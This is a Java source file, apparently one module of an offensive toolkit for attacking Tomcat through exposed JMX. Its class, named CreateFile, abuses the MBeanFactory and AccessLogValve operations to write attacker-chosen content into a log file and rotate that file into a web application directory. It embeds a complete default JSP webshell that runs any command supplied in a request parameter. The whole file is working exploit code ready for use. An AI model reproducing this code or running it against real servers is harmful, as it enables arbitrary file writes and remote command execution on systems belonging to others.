package jmxattacks;

import java.io.FileNotFoundException;
import java.io.FileReader;

import java.math.BigInteger;
import java.net.HttpURLConnection;

import java.net.URL;
import java.security.SecureRandom;

import java.util.Scanner;

import javax.management.Attribute;
import javax.management.ObjectName;

import jmxmenus.MainMenu;
import jmxutils.EasyBasicParser;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.OptionBuilder;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.apache.commons.cli.Parser;

public class CreateFile extends Attack{
	
	String description = "This attack will put content in log file and move the log file to the desired directory. File will be overwritten be carefull !!!";
	String name = "CreateFile";
	String banner = "Please enter options for this module or back to return to the main menu";
	String example = "--http-host 127.0.0.1 --http-port 8080 --filepath ../webapps/myapp/cmd.jsp --file jsp_file_to_upload";
	private static String mbean = "Catalina:type=MBeanFactory";
	private static String operation ="createAccessLoggerValve";
	private static String mbean2 = "Catalina:type=Valve,host=";
	private static String operation2 ="rotate";
	private ObjectName object ;
	private String hostname;
	private String httphost;
	private String httpport;
	private String filepath;
	private String file;
	private String filecontent;
	private String logguer ;
	private String defaultjsp ="<FORM METHOD=GET ACTION='#'><INPUT name='cmd' type=text><INPUT type=submit value='Run'></FORM><%@ page import=\"java.io.*\" %><%   String cmd = request.getParameter(\"cmd\");   String output = \"\";   if(cmd != null) {      String s = null;      try {         Process p = Runtime.getRuntime().exec(cmd);         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));         while((s = sI.readLine()) != null) {            output += s;         }      }      catch(IOException e) {         e.printStackTrace();      }   }%><pre><%=output %></pre>";
	
	public CreateFile()
	{
		this.setAttack_description(description);
		this.setAttack_name(name);
		this.filecontent="";

	}
	
	
	private Options setArgs()
	{
		Options options = new Options();
		options.addOption("h", "help", true, "prints the help content");
		   options.addOption(OptionBuilder
			       .withArgName("http-host")
			       .withLongOpt("http-host")
			       .hasArg()
			       .isRequired()
			       .withDescription("Tomcat server ip")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("http-port")
			       .withLongOpt("http-port")
			       .hasArg()
			       .isRequired()
			       .withDescription("Tomcat server port")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("filepath")
			       .withLongOpt("filepath")
			       .hasArg()
			       .isRequired()
			       .withDescription("Path to jsp file on the server")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("file")
			       .withLongOpt("file")
			       .hasArg()
			       .withDescription("jsp file to upload")
			       .create());
		   return options;
	}
	
	
	private void createLogguer(String host)
	{
		Object retour;
        Object[] a = new Object[1];
        a[0] = host;
        String[] b = new String[1];
        b[0] = "java.lang.String";
		retour = invoke(this.object, this.operation,a, b);
		this.logguer=retour.toString();
	}
	
	private void sendFile()
	{
		String url = "http://"+this.httphost+":"+this.httpport+"/";
		URL obj;
		int responseCode = 0;
		System.setProperty("sun.net.http.allowRestrictedHeaders", "true");
		try {
			System.out.println("\nSending 'GET' request to URL : " + url);
			obj = new URL(url);
			HttpURLConnection con = (HttpURLConnection) obj.openConnection();
			con.setRequestMethod("GET");
			con.setRequestProperty("User-Agent", this.filecontent);
			con.setRequestProperty("Host", this.hostname);
			responseCode = con.getResponseCode();
		} catch (Exception e) {
			System.out.println("Error sending file to " + e.getMessage());
		}
		
	}
	
	private void exploit()
	{
		//Uncomment to use the root directory of a valid host
		/*
		// GET valid host name
		String host = null;
		String path = null;
		try {
			Hostinfos hostinfo;
			hostinfo = new Hostinfos();
			ArrayList<String> list = hostinfo.getHosts_list();
			Iterator<String> it = list.iterator();	
			host = it.next();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		try {
			ObjectName obj = new ObjectName("Catalina:type=Host,host="+host);
			Object tmp_path = getAttribute(obj,"appBase");
			System.out.println(tmp_path.toString());
			path=tmp_path.toString();
		} catch (Exception e1) {
			e1.printStackTrace();
		} 
		*/
		
		// Host creation to send http request to a specific hostname
		
		CreateHost att = new CreateHost();
		att.prepareExploit("--path dir --name "+this.getHostname());
		
		//Logguer Creation to log data sent to the hostname
		try{
		createLogguer(att.getRetour().toString());
		}
		catch (Exception e) {
			System.out.println("Error when creating Logguer" );
			System.exit(1);
		}
		// Logguer Configuration to log only user-Agent	
		if (this.logguer != null)
		{
			this.setAttribute(createObject(this.logguer),new Attribute("buffered",false));
			this.setAttribute(createObject(this.logguer),new Attribute("pattern","%{User-Agent}i"));
		}
		// File content will be send to server
		sendFile();
		// Prepare to move log file to choosen file.
		ObjectName object = null;
		try {
			object = new ObjectName(this.mbean2+this.hostname+",name=AccessLogValve");
		} catch (Exception e1) {
			//e1.printStackTrace();
		} 
		
		Object retour;
        Object[] a = new Object[1];
        a[0] = this.filepath;
        String[] b = new String[1];
        b[0] = "java.lang.String";
        System.out.println("#### rotate operation will be invoke ####\n");
		retour = invoke(object, this.operation2,a, b);
		try {
			Thread.sleep(4000);
		} catch (InterruptedException e) {
			System.out.println(e.getMessage());	
		}
		
		// delete useless hostname
		RemoveHost rem = new RemoveHost();
		rem.prepareExploit("--name "+this.hostname);
		
	}
	
	private void setHostname()
	{
		SecureRandom random = new SecureRandom();
		this.hostname = new BigInteger(130, random).toString(32);
	}
	
	private String getHostname()
	{
		return this.hostname;
	}
	
	public void prepareExploit(String arg)
	{
		this.object = createObject(this.mbean);
		this.setHostname();
		
		if (this.object != null)
		{
			Parser parser = new EasyBasicParser();
			CommandLine line = null;
			
			try {
				line = parser.parse( this.setArgs(), StringtoArrayList(arg));
			} catch (ParseException e) {
				System.err.println( "Parsing failed.  Reason: " + e.getMessage() );
				System.exit(-1);
			}
			
			if (line != null)
			{
				this.httphost = line.getOptionValue("http-host").trim();
			    this.httpport = line.getOptionValue("http-port").trim();
			    this.filepath = line.getOptionValue("filepath");		  
			    this.file = line.getOptionValue("file");		
			}
			// Use the webshell given in argument
			if (this.file != null)
			{
				try {
					Scanner scanner = new Scanner(new FileReader(this.file));
					 
					 while (scanner.hasNextLine()) {
					     this.filecontent += scanner.nextLine();
					 }
				} catch (FileNotFoundException e) {
					System.out.println("\nERROR " +e.getMessage());
					try {
						Thread.sleep(2000);
					} catch (InterruptedException e1) {			
						System.out.println(e1.getMessage());	
					}
				}			
			}
			else
			{
			// For the moment the default jsp webshell only work Linux hosts
				this.filecontent= this.defaultjsp;
			}
			this.exploit();
		}
		else
		{
			System.out.println("Error the object cannot be instanciated. Does the operation " + this.operation + " is available on " + this.mbean + " ?\nReturn to the main menu \n");
		}
	}
	
	public void prepareExploit() {
		
		System.out.println(this.name + " exploit selected");
		this.object = createObject(this.mbean);
		this.setHostname();	
		if (this.object != null)
		{
			// Display Menu to retrieve options
			CommandLine line = attackMenu(this.setArgs(),this.banner,this.example);
			if (line != null)
			{
				this.httphost = line.getOptionValue("http-host").trim();
			    this.httpport = line.getOptionValue("http-port").trim();
			    this.filepath = line.getOptionValue("filepath");		  
			    this.file = line.getOptionValue("file");		
			}
			// Use the webshell given in argument
			if (this.file != null)
			{
				try {
					Scanner scanner = new Scanner(new FileReader(this.file));
					 while (scanner.hasNextLine()) {
					     this.filecontent += scanner.nextLine();
					 }
				} catch (FileNotFoundException e) {
					System.out.println("\nERROR " +e.getMessage());
					try {
						Thread.sleep(2000);
					} catch (InterruptedException e1) {
						
						System.out.println(e1.getMessage());	
					}
					MainMenu menu = new MainMenu();
				}
				
			}
			else
			{
				System.out.println("\nDefault webshell will be used, it only works on Linux hosts\n");
				this.filecontent= this.defaultjsp;
			}
			
			this.exploit();
		}
		else
		{
			System.out.println("Error the object cannot be instanciated. Does the operation " + this.operation + " is available on " + this.mbean + " ?\nReturn to the main menu \n");
		}
			MainMenu menu = new MainMenu();
	}
	

}
